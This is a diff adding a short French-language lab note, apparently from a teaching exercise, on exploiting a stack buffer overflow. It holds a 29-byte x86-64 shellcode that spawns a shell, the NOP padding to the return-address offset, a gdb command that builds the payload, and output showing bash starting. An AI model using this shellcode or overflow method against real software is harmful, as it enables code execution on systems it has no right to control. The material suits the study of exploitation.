@@ -1,0 +1,23 @@
+Voici le shellcode de 29 caractères qui lance l'exécution de bash (man bash)
+
+"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
+
+---
+
+En le complétant avec 11 caractères (par exemple "\x90") on arrive à 40, soit juste à l'emplacement de l'adresse de retour. 
+
+Il ne reste qu'à le compléter par les 7 premiers octets de l'adresse du premier octet du buffer où est copié le shellcode. 
+
+Ainsi, avec: 
+run $(python -c 'print "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05" + "\x90"*11 + "<adresse>"[::-1]')
+en remplaçant <adresse>, vous devriez aboutir à: 
+
+(gdb) c
+Continuing.
+H1�WW^ZH�//bin/shH�WT_j;X����������������
+process 6589 is executing new program: /usr/bin/bash
+
+Pour effectivement taper des commandes dans le shell, il faut autoriser gdb à exécuter des programmes (ajouter la ligne "set follow-fork-mode child" dans /etc/gdbinit), ce qui n'est pas permis sur ces machines. 
+
+
+
